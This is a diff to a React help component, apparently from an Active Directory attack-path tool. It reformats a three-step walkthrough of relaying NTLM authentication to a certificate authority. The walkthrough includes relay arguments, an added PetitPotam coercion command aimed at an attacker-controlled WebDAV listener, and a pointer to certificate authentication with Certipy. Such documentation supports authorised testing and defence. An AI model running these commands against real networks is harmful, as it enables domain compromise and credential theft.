@@ -20,8 +20,9 @@ import { FC } from 'react';
 const LinuxAbuse: FC = () => {
     return (
         <>
+            <Typography variant={'body1'}>1. Start the Relay Server</Typography>
             <Typography variant={'body2'}>
-                1. Start the Relay Server The NTLM relay can be executed with{' '}
+                The NTLM relay can be executed with{' '}
                 <Link
                     target='_blank'
                     rel='noopener'
@@ -35,8 +36,9 @@ const LinuxAbuse: FC = () => {
                 {'-t rpc://<CA_IP> -rpc-mode ICPR -icpr-ca-name <CA_NAME> -smb2support'}
             </Typography>
 
+            <Typography variant={'body1'}>2. Coerce the Target Computer</Typography>
             <Typography variant={'body2'}>
-                2. Coerce the Target Computer Several coercion methods are documented here:{' '}
+                Several coercion methods are documented here:{' '}
                 <Link
                     target='_blank'
                     rel='noopener'
@@ -65,8 +67,17 @@ const LinuxAbuse: FC = () => {
                     </li>
                 </ul>
             </Typography>
+            <Typography variant={'body2'}>
+                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
+                Connection String format: <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>. Example:
+            </Typography>
+            <Typography component={'pre'}>
+                {'Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS@PORT/file.txt" "VICTIM_IP"'}
+            </Typography>
+
+            <Typography variant={'body1'}>3. Perform Certificate Authentication</Typography>
             <Typography variant='body2'>
-                3. Authenticate using the certificate obtained as the target principal, for example by using{' '}
+                Authenticate using the certificate obtained as the target principal, for example by using{' '}
                 <Link target='_blank' rel='noopener' href='https://github.com/ly4k/Certipy'>
                     Certipy
                 </Link>
